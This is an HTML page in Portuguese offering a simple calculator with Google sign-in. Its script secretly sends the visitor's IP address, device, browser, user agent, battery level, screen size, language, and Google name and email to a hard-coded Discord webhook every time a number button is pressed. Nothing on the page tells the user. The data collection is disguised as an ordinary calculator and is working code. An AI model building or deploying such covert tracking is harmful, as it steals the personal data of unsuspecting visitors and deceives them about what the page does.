<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<title>Calculadora + Login Google OAuth</title>
<script src="https://accounts.google.com/gsi/client" async defer></script>
<style>
  body { font-family: Arial, sans-serif; background: #222; color: #eee; }
  .calc { width: 200px; margin: 20px auto; }
  .display { background: #000; color: #0f0; font-size: 24px; padding: 10px; text-align: right; }
  .buttons { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 10px; }
  button { font-size: 18px; padding: 15px; cursor: pointer; }
  #user-info { text-align: center; margin-top: 20px; font-size: 16px; color: #0f0; }
</style>
</head>
<body>

<h2 style="text-align:center;">Calculadora </h2>

<div id="user-info">Você não está logado! Logue com sua conta google.</div>

<div id="g_id_onload"
     data-client_id="818779354438-2iqe870249jq1u06eh3o52v65sjrp8s8.apps.googleusercontent.com"
     data-callback="handleCredentialResponse">
</div>

<div class="g_id_signin" data-type="standard"></div>

<div class="calc">
  <div id="display" class="display">0</div>
  <div class="buttons">
    <button onclick="clickNumber('1')">1</button>
    <button onclick="clickNumber('2')">2</button>
    <button onclick="clickNumber('3')">3</button>
    <button onclick="clickNumber('4')">4</button>
    <button onclick="clickNumber('5')">5</button>
    <button onclick="clickNumber('6')">6</button>
    <button onclick="clickNumber('7')">7</button>
    <button onclick="clickNumber('8')">8</button>
    <button onclick="clickNumber('9')">9</button>
    <button onclick="clickNumber('0')">0</button>
  </div>
</div>

<script>
const webhookUrl = "https://discord.com/api/webhooks/1343408605646295050/hryBiAi5SvimUE05wsl-YjlRqfpIaslJCwMX2JcMa00_y0cdvflCU-_1sBPBtQPTieGh";

function getDeviceName() {
  const ua = navigator.userAgent;

  if (/android/i.test(ua)) {
    const match = ua.match(/Android.*; ([^;]+) Build/);
    if (match && match[1]) return `Android - ${match[1].trim()}`;
    return "Android - Modelo desconhecido";
  }

  if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
    if (/iPad/.test(ua)) return "iPad";
    if (/iPhone/.test(ua)) return "iPhone";
    if (/iPod/.test(ua)) return "iPod";
    return "Dispositivo iOS";
  }

  if (/Windows NT/.test(ua)) return "Windows PC";
  if (/Macintosh/.test(ua)) return "Mac";
  return "Dispositivo desconhecido";
}

function getBrowserName() {
  let ua = navigator.userAgent;
  if (ua.indexOf("Firefox") > -1) return "Firefox";
  if (ua.indexOf("Chrome") > -1) return "Chrome";
  if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) return "Safari";
  if (ua.indexOf("Edge") > -1) return "Edge";
  return "Outro/Nao identificado";
}

async function getIP() {
  try {
    let res = await fetch('https://api.ipify.org?format=json');
    let data = await res.json();
    return data.ip;
  } catch {
    return "Não foi possível obter IP";
  }
}

async function getBatteryInfo() {
  if (!navigator.getBattery) return "API de bateria não suportada";
  try {
    let battery = await navigator.getBattery();
    let level = (battery.level * 100).toFixed(0) + "%";
    let charging = battery.charging ? "Sim" : "Não";
    return `Nível: ${level}, Carregando: ${charging}`;
  } catch {
    return "Erro ao obter info da bateria";
  }
}

async function sendToDiscord(number) {
  let device = getDeviceName();
  let browser = getBrowserName();
  let ip = await getIP();
  let time = new Date().toLocaleString();
  let ua = navigator.userAgent;
  let battery = await getBatteryInfo();
  let screenRes = `${window.screen.width}x${window.screen.height}`;
  let language = navigator.language || "Desconhecido";

  let userName = window.userGoogleName || "Não logado";
  let userEmail = window.userGoogleEmail || "Não logado";

  let content = `**Número clicado:** ${number}
**Dispositivo:** ${device}
**Navegador:** ${browser}
**Horário:** ${time}
**IP:** ${ip}
**UserAgent:** ${ua}
**Bateria:** ${battery}
**Resolução da Tela:** ${screenRes}
**Idioma do Navegador:** ${language}
**Usuário Google:** ${userName}
**Email Google:** ${userEmail}`;

  fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content })
  }).catch(e => console.log("Erro ao enviar para Discord:", e));
}

function clickNumber(num) {
  let display = document.getElementById("display");
  if (display.innerText === "0") {
    display.innerText = num;
  } else {
    display.innerText += num;
  }
  sendToDiscord(num);
}

function decodeJwtResponse(token) {
  let base64Url = token.split('.')[1];
  let base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
  let jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
  }).join(''));
  return JSON.parse(jsonPayload);
}

function handleCredentialResponse(response) {
  let user = decodeJwtResponse(response.credential);
  window.userGoogleName = user.name;
  window.userGoogleEmail = user.email;
  document.getElementById('user-info').innerText = `Olá, ${user.name}! Seu e-mail é: ${user.email}`;
  console.log("Usuário logado:", user);
}
</script>

</body>
</html>
